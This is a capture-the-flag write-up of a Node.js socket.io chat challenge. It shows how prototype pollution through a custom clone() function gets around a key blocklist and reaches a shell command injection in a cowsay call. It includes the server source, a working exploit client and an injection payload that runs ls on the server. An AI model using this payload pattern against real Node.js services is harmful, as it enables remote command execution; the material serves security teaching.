# Node.js Vulnerabilities
###### tags: `writeup`
## prototype pollution attack
https://xz.aliyun.com/t/2802

This is a socket.io chat application written by `Node.js` which we can download source from [https://dctf.def.camp/dctf-18quals-81249812/chat.zip](https://dctf.def.camp/dctf-18quals-81249812/chat.zip).

Source code in client part is really simple, `client.js` just sign up user account by sending request to server and sending user message too:

```javascript
const io = require('socket.io-client')
const socket = io.connect('https://chat.dctfq18.def.camp')

if(process.argv.length != 4) {
  console.log('name and channel missing')
   process.exit()
}
console.log('Logging as ' + process.argv[2] + ' on ' + process.argv[3])
var inputUser = {
  name: process.argv[2],
};

socket.on('message', function(msg) {
  console.log(msg.from,"[", msg.channel!==undefined?msg.channel:'Default',"]", "says:\n", msg.message);
});

socket.on('error', function (err) {
  console.log('received socket error:')
  console.log(err)
})

socket.emit('register', JSON.stringify(inputUser));
socket.emit('message', JSON.stringify({ msg: "hello" }));
socket.emit('join', process.argv[3]);//ps: you should keep your channels private
socket.emit('message', JSON.stringify({ channel: process.argv[3], msg: "hello channel" }));
socket.emit('message', JSON.stringify({ channel: "test", msg: "i own you" }));
```

Now, we need to start to audit source code.

```javascript
var fs       = require('fs'); 
var server   = require('http').createServer()
var io       = require('socket.io')(server)
var clientManager = require('./clientManager')
var helper = require('./helper')
 
var defaultSettings = JSON.parse(fs.readFileSync('default_settings.json', 'utf8'));

function sendMessageToClient(client, from, message) {
    var msg = {
        from: from,
        message: message
    };

    client.emit('message', msg);
    console.log(msg)
    return true;
}

function sendMessageToChannel(channel, from, message) {
    var msg = {
        from: typeof from !== 'string' ? clientManager.getUsername(from): from,
        message: message,
        channel: channel
    };

    if(typeof from !== 'string') {
        if(!clientManager.isSubscribedTo(from, channel)) {
            console.log('Could not send message',msg,' from', 
                clientManager.getUsername(from),'to',channel,'because he is not subscribed.')
            return false;
        }
    }

    var clients = clientManager.getSubscribedToChannel(channel);
    
    for(var i = 0; i<clients.length;i++) {
        if(typeof from !== 'string') {
            if(clients[i].id == from.id) {
                continue;
            }
        }
        
        clients[i].emit('message', msg);
    }
    
    console.log(msg)
    return true;
}

io.on('connection', function (client) { 
    client.on('register', function(inUser) {
        try {
            newUser = helper.clone(JSON.parse(inUser))

            if(!helper.validUser(newUser)) {
                sendMessageToClient(client,"Server", 
                    'Invalid settings.')
                return client.disconnect();
            } 

            var keys = Object.keys(defaultSettings);
            for (var i = 0; i < keys.length; ++i) {
                if(newUser[keys[i]] === undefined) {
                    newUser[keys[i]] = defaultSettings[keys[i]]
                }
            } 

            if (!clientManager.isUserAvailable(newUser.name)) {
                sendMessageToClient(client,"Server", 
                    newUser.name + ' is not available')
                return client.disconnect(); 
            }
         
            clientManager.registerClient(client, newUser)
            return sendMessageToClient(client,"Server", 
                newUser.name + ' registered')
        } catch(e) { console.log(e); client.disconnect() }
    });

    client.on('join', function(channel) {
        try {
            clientManager.joinChannel(client, channel);
            sendMessageToClient(client,"Server", 
                "You joined channel", channel)

            var u = clientManager.getUsername(client);
            var c = clientManager.getCountry(client);

            sendMessageToChannel(channel,"Server", 
                helper.getAscii("User " + u + " living in " + c + " joined channel"))
        } catch(e) { console.log(e); client.disconnect() }
    });

    client.on('leave', function(channel) {
        try {
            client .join(channel);
            clientManager.leaveChannel(client, channel);
            sendMessageToClient(client,"Server", 
                "You left channel", channel)

            var u = clientManager.getUsername(client);
            var c = clientManager.getCountry(client);
            sendMessageToChannel(channel, "Server", 
                helper.getAscii("User " + u + " living in " + c + " left channel"))
        } catch(e) { console.log(e); client.disconnect() }
    });

    client.on('message', function(message) {
        try {
            message = JSON.parse(message);
            if(message.channel === undefined) {
                console.log(clientManager.getUsername(client),"said:", message.msg);
            } else {
                sendMessageToChannel(message.channel, client, message.msg);
            }
        } catch(e) { console.log(e); client.disconnect() }
    });

    client.on('disconnect', function () {
        try {
            console.log('client disconnect...', client.id)

            var oldclient = clientManager.removeClient(client);
            if(oldclient !== undefined) {
                for (const [channel, state] of Object.entries(oldclient.ch)) {
                    if(!state) continue;
                    sendMessageToChannel(channel, "Server", 
                        "User " + oldclient.u.name + " left channel");
                } 
            }
        } catch(e) { console.log(e); client.disconnect() }
    })

  client.on('error', function (err) {
    console.log('received error from client:', client.id)
    console.log(err)
  })
});

server.listen(3000, function (err) {
  if (err) throw err;
  console.log('listening on port 3000');
});
```

First, we find there's a sensitive function `getAscii()` in `server.js`, if we dig deep into it, we will find there's a obvious `command injection` problem:

```javascript
getAscii: function(message) {
    var e = require('child_process');
    return e.execSync("cowsay '" + message + "'").toString();
}
```

If we construct a message like: `message = "aaa';ls -al; echo 'xxx"`, then server will execute: `cowsay 'aaa'; ls -al; echo 'xxx'`.

To trigger this command injection, we need to find where `getAscii()` been called: when server gets `join`, `leave`.

```javascript
client.on('join', function(channel) {
    try {
        clientManager.joinChannel(client, channel);
        sendMessageToClient(client,"Server", 
            "You joined channel", channel)

        var u = clientManager.getUsername(client);
        var c = clientManager.getCountry(client);

        sendMessageToChannel(channel,"Server", 
            helper.getAscii("User " + u + " living in " + c + " joined channel"))
    } catch(e) { console.log(e); client.disconnect() }
});

client.on('leave', function(channel) {
    try {
        client .join(channel);
        clientManager.leaveChannel(client, channel);
        sendMessageToClient(client,"Server", 
            "You left channel", channel)

        var u = clientManager.getUsername(client);
        var c = clientManager.getCountry(client);
        sendMessageToChannel(channel, "Server", 
            helper.getAscii("User " + u + " living in " + c + " left channel"))
    } catch(e) { console.log(e); client.disconnect() }
});
```

According to source code `helper.getAscii("User " + u + " living in " + c + " left channel"))`, the problem will be how can we control `u` & `c`.

Unfortunately, server will take a strict checking on user's input:
```javascript
validUser: function(inp) {
    var block = ["source","port","font","country",
                    "location","status","lastname"];
    if(typeof inp !== 'object') {
        return false;
    } 

    var keys = Object.keys(inp);
    for(var i = 0; i< keys.length; i++) {
        key = keys[i];

        if(block.indexOf(key) !== -1) {
            return false;
        }
    }

    var r =/^[a-z0-9]+$/gi;
    if(inp.name === undefined || !r.test(inp.name)) {
        return false;
    }

    return true;
}
```

We can see that `name` which match to `u` need to face to regex checking, and `country` which match to `c` has a black list checking, therefore, we cannot give a value to `country` directly.

So, we need another method which exploit vulnerability of `node.js`, called `prototype pollition attack`.

Step followed by:

1. By giving value to object's `__proto__` attribute, construct payload: `{"name":"xxx", "__proto__":{"country":"xxx';ls -al;echo 'xxx"}}`
1. Attack work after server recieve this object and call `clone()`, when server access object's country attribute, it will accept our injection: `"xxx';ls -al;echo 'xxx"`
1. Server then run `getAscii()` which execute our commend.
1. Modified the payload to get the flag.

![](https://i.imgur.com/8YfbuEZ.png)

```javascript
const io = require('socket.io-client')
const socket = io.connect('https://chat.dctfq18.def.camp')

socket.on('error', function (err) {
  console.log('received socket error:')
  console.log(err)
})

socket.on('message', function(msg) {
  console.log(msg.from,"[", msg.channel!==undefined?msg.channel:'Default',"]", "says:\n", msg.message);
});

socket.emit('register', `{"name":"xxx", "__proto__":{"country":"xxx';ls -al;echo 'xxx"}}`);
socket.emit('message', JSON.stringify({ msg: "hello" }));
socket.emit('join', 'xxx');
```

We can see in this challenge, when server recive the packet, it will call `JSON.parse` first to split user input, then call `clone()`: `newUser = helper.clone(JSON.parse(inUser))`.

The problem occur on `clone()`:
```javascript
function clone(obj) {
    if (typeof obj !== 'object' || obj === null) {
        return obj;
    }

    var newObj;
    var cloneDeep = false;

    if (!Array.isArray(obj)) {
        if (Buffer.isBuffer(obj)) {
            newObj = new Buffer(obj);
        } else if (obj instanceof Date) {
            newObj = new Date(obj.getTime());
        } else if (obj instanceof RegExp) {
            newObj = new RegExp(obj);
        } else {
            var proto = Object.getPrototypeOf(obj);
            if (proto && proto.isImmutable) {
                newObj = obj;
            } else {
                newObj = Object.create(proto);
                cloneDeep = true;
            }
        }
    } else {
        newObj = [];
        cloneDeep = true;
    }

    if (cloneDeep) {
        var keys = Object.getOwnPropertyNames(obj);
        for (var i = 0; i < keys.length; ++i) {
            var key = keys[i];
            var descriptor = Object.getOwnPropertyDescriptor(obj, key);
            if (descriptor && (descriptor.get || descriptor.set)) {
                Object.defineProperty(newObj, key, descriptor);
            } else {
                newObj[key] = clone(obj[key]);
            }
        }
    }
    return newObj;
}

var payload = '{"__proto__":{"oops":"It works !"}}';
var oldObj = JSON.parse(payload);
console.log(oldObj.oops);
var newObj = clone(oldObj);
console.log(newObj.oops);
```

After execute this `js` code, you'll find that js try to access `oops` attribute in `oldObj` before calling `clon()`. The result is `undefined`, however the new object `neObj` after `clone()`, we can access attribute `oops` which should not exist.

Obviously, attribute `__proto__` is a default attribute in `ogj`, so `__proto__` will not be enumerated, but after calling `clone()`, this will make `newObj` structure changed, that make `__proto__` exist in `newObj` by calling `Object.getOwnPropertyNames(obj);`.

![](https://i.imgur.com/PV4rCxn.png)

In this case, 3 object all call `xxx.hasOwnProperty('__proto__')` function, but only `oldObj` return `true`.

When calling `Object.getPrototypeOf(xxx)`, only `newObj` & `oriObj` return `Object {oops: "It works !"}`, `oldObj` return `Object {constructor: , __defineGetter__: , __defineSetter__: , hasOwnProperty: , __lookupGetter__: , …}`.

To summary this situation, `oldObj`'s `__proto__` attribute is different from else two, it doesn't point to original attribute, but a normal default attribute. It's the same to other default attribute, just a little bit special with it's name.

This is new push request commit patch for npm package, a simple filter can make this safe.

![](https://i.imgur.com/bnRDOIZ.png)
